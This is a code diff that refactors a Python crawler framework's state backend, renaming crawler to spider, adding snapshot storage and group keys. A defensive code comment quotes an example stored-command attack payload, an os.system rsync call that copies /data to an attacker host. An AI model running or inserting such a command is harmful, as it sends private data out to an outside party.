@@ -19,10 +19,11 @@ from tider.utils.serialization import (
     get_pickleable_exception, get_pickled_exception
 )
 from tider.utils.time import get_exponential_backoff_interval
+from tider.utils.nodenames import nodename, nodesplit
 
 __all__ = (
     'backend_serializer_registry', 'State',
-    'BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend',
+    'Backend', 'KeyValueStoreBackend', 'DisabledBackend',
 )
 
 EXCEPTION_ABLE_CODECS = frozenset({'pickle'})
@@ -33,22 +34,24 @@ backend_serializer_registry = serializer_registry
 
 
 class State(str, enum.Enum):
-    #: Crawler state is unknown (assumed pending since you know the hostname).
+    #: Spider state is unknown (assumed pending since you know the hostname).
     PENDING = 'PENDING'
-    #: Crawler was started.
+    #: Spider was started.
     STARTED = 'STARTED'
-    #: Crawler running
+    #: Spider running
     RUNNING = 'RUNNING'
-    #: Crawler succeeded
+    #: Spider succeeded
     SUCCESS = 'SUCCESS'
-    #: Crawler failed
+    #: Spider failed
     FAILURE = 'FAILURE'
-    #: Crawler was revoked.
+    #: Spider was revoked.
     REVOKED = 'REVOKED'
 
 
 class Backend:
+    """Base spider backend."""
 
+    NORMAL_STATES = frozenset({State.PENDING, State.STARTED, State.RUNNING, State.SUCCESS})
     EXCEPTION_STATES = frozenset({State.FAILURE, State.REVOKED})
     READY_STATES = frozenset({State.SUCCESS, State.FAILURE, State.REVOKED})
 
@@ -57,7 +60,7 @@ class Backend:
     #: If true the backend must implement :meth:`get_many`.
     supports_native_join = False
 
-    #: If true the backend must automatically expire results.
+    #: If true the backend must automatically expire spider states.
     #: The daily backend_cleanup periodic task won't be triggered
     #: in this case.
     supports_autoexpire = False
@@ -74,9 +77,12 @@ class Backend:
 
     def __init__(self, crawler, serializer=None, accept=None, expires=None, expires_type=None, url=None):
         self.crawler = crawler
+        self.group = crawler.group
+        self._store_id = nodename(f'{nodesplit(self.group)[0]}.{str(crawler.pid)}', nodesplit(self.group)[-1])
+        self.spider = crawler.spider
 
         self.serializer = serializer or self.get_config('SERIALIZER', 'json')
-        self.content_type, self.content_encoding, self.encoder = serializer_registry._encoders[self.serializer]
+        self.content_type, self.content_encoding, self.encoder = serializer_registry._encoders.get(self.serializer, (None, None, None))
         self.expires = self.prepare_expires(expires, expires_type)
 
         self.accept = accept or self.get_config("ACCEPT_CONTENT")
@@ -105,29 +111,25 @@ class Backend:
         return url[:-1] if url.endswith(':///') else url
 
     def mark_as_started(self):
-        """Mark crawler as started."""
-        return self.store_result(self.crawler.stats.get_stats(), State.STARTED)
+        """Mark spider as started."""
+        return self.store_snapshot(State.STARTED)
 
-    def mark_as_running(self):
-        """Mark crawler as running."""
-        return self.store_result(self.crawler.stats.get_stats(), State.RUNNING)
-
-    def mark_as_done(self, store_result=True, state=State.SUCCESS):
-        """Mark crawler as successfully executed."""
-        if not store_result:
+    def mark_as_done(self, store_snapshot=True, state=State.SUCCESS):
+        """Mark spider as successfully executed."""
+        if not store_snapshot:
             return
-        self.store_result(self.crawler.stats.get_stats(), state)
+        self.store_snapshot(state)
 
-    def mark_as_failure(self, exc, traceback=None, store_result=True, state=State.FAILURE):
-        """Mark crawler as executed with failure."""
-        if not store_result:
+    def mark_as_failure(self, exc, traceback=None, store_snapshot=True, state=State.FAILURE):
+        """Mark spider as executed with failure."""
+        if not store_snapshot:
             return
-        self.store_result(exc, state, traceback=traceback)
+        self.store_snapshot(state, exc=exc, traceback=traceback)
 
-    def mark_as_revoked(self, reason='', store_result=True, state=State.REVOKED):
+    def mark_as_revoked(self, reason='', store_snapshot=True, state=State.REVOKED):
         exc = CrawlerRevokedError(reason)
-        if store_result:
-            self.store_result(exc, state, traceback=None)
+        if store_snapshot:
+            self.store_snapshot(state, exc=exc, traceback=None)
 
     def prepare_exception(self, exc, serializer=None):
         """Prepare exception for serialization."""
@@ -180,7 +182,7 @@ class Backend:
         # could exploit a stored command vulnerability to execute arbitrary
         # python code such as:
         # os.system("rsync /data attacker@192.168.56.100:~/data")
-        # The attacker sets the task's result to a failure in the result
+        # The attacker sets the task's result to a failure in the spider
         # backend with the os as the module, the system function as the
         # exception type and the payload
         # rsync /data attacker@192.168.56.100:~/data
@@ -215,11 +217,11 @@ class Backend:
         return dumps(data, serializer=self.serializer)
 
     def meta_from_decoded(self, meta):
-        if meta['status'] in self.EXCEPTION_STATES:
-            meta['result'] = self.exception_to_python(meta['result'])
+        if meta['status'] in self.EXCEPTION_STATES and meta.get('traceback'):
+            meta['traceback'] = self.exception_to_python(meta['traceback'])
         return meta
 
-    def decode_result(self, payload):
+    def decode_meta(self, payload):
         return self.meta_from_decoded(self.decode(payload))
 
     def decode(self, payload):
@@ -231,13 +233,13 @@ class Backend:
                      content_encoding=self.content_encoding,
                      accept=self.accept)
 
-    def prepare_value(self, result):
+    def prepare_value(self):
         """Prepare value for storage."""
-        return result
+        return self.spider.meta
 
     def prepare_expires(self, value, exp_type=None):
         if value is None:
-            value = self.crawler.settings.get(f'{self.config_namespace}_EXPIRES', 7 * 86400)
+            value = self.get_config('EXPIRES', 7 * 86400)
         if isinstance(value, timedelta):
             value = value.total_seconds()
         if value is not None and exp_type:
@@ -247,15 +249,15 @@ class Backend:
     def prepare_persistent(self, enabled=None):
         if enabled is not None:
             return enabled
-        persistent = self.crawler.settings.get(f'{self.config_namespace}_PERSISTENT')
+        persistent = self.get_config('PERSISTENT')
         return self.persistent if persistent is None else persistent
 
-    def prepare_result(self, result, state):
-        if state in self.EXCEPTION_STATES and isinstance(result, Exception):
-            return self.prepare_exception(result)
-        return self.prepare_value(result)
+    def encode_snapshot(self, state, exc=None):
+        if state in self.EXCEPTION_STATES and isinstance(exc, Exception):
+            return self.prepare_exception(exc)
+        return self.prepare_value()
 
-    def _gen_crawler_meta(self, result, state, traceback, format_date=True):
+    def _gen_spider_meta(self, snapshot, state, traceback, format_date=True):
         if state in self.READY_STATES:
             date_done = self.crawler.app.now()
             if format_date:
@@ -263,34 +265,33 @@ class Backend:
         else:
             date_done = None
         meta = {
+            'group': self.crawler.group,
             'schema': self.crawler.schema,
             'spidername': self.crawler.spidername,
-            'pid': self.crawler.pid,
             'server': self.crawler.svr,
-            'group': self.crawler.group,
             'status': state,
-            'stats': result,
-            'failures': {},
-            'errors': {},
+            'pid': self.crawler.pid,
+            'meta': snapshot,
+            'stats': self.crawler.stats.get_stats(),
             'traceback': traceback,
             'date_done': date_done,
         }
         return meta
 
     def _sleep(self, amount):
-        time.sleep(amount)
+        self.crawler.sleep(amount)
 
-    def store_result(self, result, state, traceback=None, **kwargs):
-        """Update crawler state and stats.
+    def store_snapshot(self, state: State = State.RUNNING, exc=None, traceback=None, **kwargs):
+        """Update spider states and stats.
 
         if always_retry_backend_operation is activated, in the event of a recoverable exception,
         then retry operation with an exponential backoff until a limit has been reached.
         """
-        result = self.prepare_result(result, state)  # stats, errors, failures.
+        snapshot = self.encode_snapshot(state, exc=exc)
         retries = 0
         while True:
             try:
-                return self._store_result(result, state, traceback, **kwargs)
+                return self._store_snapshot(snapshot, state, traceback, **kwargs)
             except Exception as exc:
                 if self.always_retry and self.exception_safe_to_retry(exc):
                     if retries < self.max_retries:
@@ -304,39 +305,28 @@ class Backend:
                         self._sleep(sleep_amount)
                     else:
                         raise_with_context(
-                            BackendStoreError("Failed to store result on the backend"),
+                            BackendStoreError("Failed to store snapshot on the backend"),
                         )
                 else:
                     raise
 
-    def forget(self, group=False):
-        if not group:
-            self._forget()
-        else:
-            self._delete_group()
+    def forget(self):
+        self._forget()
 
     def _forget(self):
         raise NotImplementedError('backend does not implement forget.')
 
     def get_state(self):
-        """Get the state of a crawler."""
-        return self.get_meta()['status']
+        """Get the state of a spider."""
+        return self.get_spider_meta()['status']
 
     def get_traceback(self):
-        """Get the traceback for a failed crawler."""
-        return self.get_meta().get('traceback')
+        """Get the traceback for a failed spider."""
+        return self.get_spider_meta().get('traceback')
 
     def get_stats(self):
-        """Get the stats of a crawler."""
-        return self.get_meta().get('stats')
-
-    def get_errors(self):
-        """Get the errors of a crawler."""
-        return self.get_meta().get('errors')
-
-    def get_failures(self):
-        """Get the failures of a crawler."""
-        return self.get_meta().get('failures')
+        """Get the stats of a spider."""
+        return self.get_spider_meta().get('stats')
 
     def exception_safe_to_retry(self, exc):
         """Check if an exception is safe to retry.
@@ -348,8 +338,8 @@ class Backend:
         """
         return False
 
-    def get_meta(self, group=False):
-        """Get crawler meta from backend.
+    def get_spider_meta(self):
+        """Get spider meta from backend.
 
         if always_retry_backend_operation is activated, in the event of a recoverable exception,
         then retry operation with an exponential backoff until a limit has been reached.
@@ -357,9 +347,7 @@ class Backend:
         retries = 0
         while True:
             try:
-                if group:
-                    return self._get_group_meta()
-                return self._get_crawler_meta()
+                return self._get_spider_meta()
             except Exception as exc:
                 if self.always_retry and self.exception_safe_to_retry(exc):
                     if retries < self.max_retries:
@@ -378,6 +366,12 @@ class Backend:
                 else:
                     raise
 
+    def get_group(self):
+        return self._get_group()
+
+    def delete_group(self):
+        return self._delete_group()
+
     def cleanup(self):
         """Backend cleanup."""
 
@@ -385,39 +379,52 @@ class Backend:
         """Release backend resources."""
 
 
-class BaseBackend(Backend):
-    """Base stats backend."""
-
-
 class KeyValueStoreBackend(Backend):
+    """Spider backend base class for key/value stores."""
+
     key_t = ensure_bytes
-    crawler_keyprefix = 'tider-crawler-meta-'
+    spider_keyprefix = 'tider-spider-meta-'
+    group_keyprefix = 'tider-crawlergroup-meta-'
 
     def __init__(self, *args, **kwargs):
         if hasattr(self.key_t, '__func__'):  # pragma: no cover
             self.key_t = self.key_t.__func__  # remove binding
         super().__init__(*args, **kwargs)
-        self._resolve_keyprefix()
+        self._add_global_keyprefix()
+        self._encode_prefixes()
 
-    def _resolve_keyprefix(self):
+    def _add_global_keyprefix(self):
         """
         This method prepends the global keyprefix to the existing keyprefixes.
 
-        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
-        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
+        This method checks if a global keyprefix is configured in `BACKEND_TRANSPORT_OPTIONS` using the
+        `global_keyprefix` key. If so, then it is prepended to the task and group key prefixes.
         """
-        global_keyprefix = self.crawler.settings.get(f'{self.config_namespace}_TRANSPORT_OPTIONS', {}).get("global_keyprefix", None)
+        global_keyprefix = self.get_config('TRANSPORT_OPTIONS', {}).get("global_keyprefix", None)
         if global_keyprefix:
             if global_keyprefix[-1] not in ':_-.':
                 global_keyprefix += '_'
-            self.crawler_keyprefix = f"{global_keyprefix}{self.crawler_keyprefix}"
-        self.crawler_keyprefix = self.key_t(self.crawler_keyprefix)
+            self.spider_keyprefix = f"{global_keyprefix}{self.spider_keyprefix}"
+            self.group_keyprefix = f"{global_keyprefix}{self.group_keyprefix}"
+
+    def _encode_prefixes(self):
+        self.spider_keyprefix = self.key_t(self.spider_keyprefix)
+        self.group_keyprefix = self.key_t(self.group_keyprefix)
 
     def get(self, key):
         raise NotImplementedError('Must implement the get method.')
 
     def mget(self, keys):
         raise NotImplementedError('Does not support get_many')
+
+    def sadd(self, key, values):
+        raise NotImplementedError('Does not support sadd')
+
+    def sget(self, key, **kwargs):
+        raise NotImplementedError('Does not support sget')
+
+    def srem(self, key, values):
+        raise NotImplementedError('Does not support srem')
 
     def set(self, key, value):
         raise NotImplementedError('Must implement the set method.')
@@ -434,58 +441,67 @@ class KeyValueStoreBackend(Backend):
     def expire(self, key, value):
         pass
 
-    def _get_crawler_meta(self):
-        """Get crawler meta-data."""
-        meta = self.get(self.get_crawler_key())
+    def _get_spider_meta(self):
+        """Get spider meta-data."""
+        meta = self.get(self.get_spider_key())
         if not meta:
-            return {'status': State.PENDING, 'stats': None}
-        return self.decode_result(meta)
+            return {'status': State.PENDING, 'meta': None}
+        return self.decode_meta(meta)
 
-    def get_crawler_key(self):
-        """Get the cache key for crawler."""
+    def get_spider_key(self):
+        """Get the cache key for spider."""
         key_t = self.key_t
         return key_t('').join([
-            self.crawler_keyprefix, key_t(self.crawler.hostname)
+            self.spider_keyprefix, key_t(self._store_id)
+        ])
+
+    def get_group_key(self):
+        """Get the cache key for group."""
+        key_t = self.key_t
+        return key_t('').join([
+            self.group_keyprefix, key_t(self.crawler.group)
         ])
 
     def _strip_prefix(self, key):
         """Take bytes: emit string."""
         key = self.key_t(key)
-        prefix = self.crawler_keyprefix
+        prefix = self.spider_keyprefix
         if key.startswith(prefix):
             return bytes_to_str(key[len(prefix):])
         return bytes_to_str(key)
 
-    def _filter_ready(self, values):
+    def _filter_states(self, values, states=None):
+        states = states or []
         for k, value in values:
             if value is not None:
-                value = self.decode_result(value)
-                if value['status'] in self.READY_STATES:
+                value = self.decode_meta(value)
+                if value['status'] in states:
                     yield k, value
 
-    def _mget_to_results(self, values, keys):
+    def _mget_to_results(self, values, keys, states=None):
         if hasattr(values, 'items'):
             # client returns dict so mapping preserved.
             return {
                 self._strip_prefix(k): v
-                for k, v in self._filter_ready(values.items())
+                for k, v in self._filter_states(values.items(), states)
             }
         else:
             # client returns list so need to recreate mapping.
             return {
                 bytes_to_str(self._strip_prefix(keys[i])): v
-                for i, v in self._filter_ready(enumerate(values))
+                for i, v in self._filter_states(enumerate(values), states)
             }
 
-    def _get_many(self, timeout=None, interval=0.5,
-                  on_message=None, on_interval=None, max_iterations=None):
+    def get_many(self, timeout=None, interval=0.5, on_message=None, on_interval=None,
+                 max_iterations=None, states=None):
+        states = states if states is not None else self.READY_STATES
         interval = 0.5 if interval is None else interval
         iterations = 0
-        ids = set([each for each in self.scan(pattern=f'{self.crawler.group}*')])
-        while ids:
-            keys = list(ids)
-            r = self._mget_to_results(self.mget(keys), keys)
-            ids.difference_update({bytes_to_str(v) for v in r})
+        names = set([each for each in self.scan(pattern=f'{self.crawler.group}*')])
+        while names:
+            keys = list(names)
+            r = self._mget_to_results(self.mget(keys), keys, states)
+            names.difference_update({bytes_to_str(v) for v in r})
             for key, value in r.items():
                 if on_message is not None:
                     on_message(value)
@@ -499,27 +515,31 @@ class KeyValueStoreBackend(Backend):
             if max_iterations and iterations >= max_iterations:
                 break
 
-    def _get_group_meta(self):
-        result = {k: v for k, v in self._get_many()}
-        return result
-
     def _forget(self):
-        self.delete(self.get_crawler_key())
+        self.delete(self.get_spider_key())
+
+    def _store_snapshot(self, snapshot, state, traceback=None, **kwargs):
+        meta = self._gen_spider_meta(snapshot=snapshot, state=state, traceback=traceback)
+        try:
+            self.sadd(self.get_group_key(), self.get_spider_key())
+            self.set(self.get_spider_key(), self.encode(meta))
+        except BackendStoreError as e:
+            raise BackendStoreError(str(e), state=state, spider_id=self._store_id) from e
 
     def _delete_group(self):
         for key in self.scan(pattern=f'{self.crawler.group}*'):
             self.delete(key)
+        self.delete(self.get_group_key())
 
-    def _store_result(self, result, state, traceback=None, **kwargs):
-        meta = self._gen_crawler_meta(result=result, state=state, traceback=traceback)
-        meta['hostname'] = self.crawler.hostname
-        self.set(self.get_crawler_key(), self.encode(meta))
+    def _get_group(self):
+        result = {k: v for k, v in self.get_many()}
+        return result
 
 
-class DisabledBackend(BaseBackend):
-    """Dummy result backend."""
+class DisabledBackend(Backend):
+    """Dummy spider backend."""
 
-    def store_result(self, *args, **kwargs):
+    def store_snapshot(self, *args, **kwargs):
         pass
 
     def forget(self, group=False):
@@ -531,5 +551,5 @@ class DisabledBackend(BaseBackend):
     def as_uri(self, *args, **kwargs):
         return 'disabled://'
 
-    get_state = get_stats = get_errors = get_failures = get_traceback = _is_disabled
-    _get_crawler_meta = _get_group_meta = _is_disabled
+    get_state = get_stats = get_spider_meta = get_traceback = _is_disabled
+    _get_spider_meta = _get_group = _is_disabled
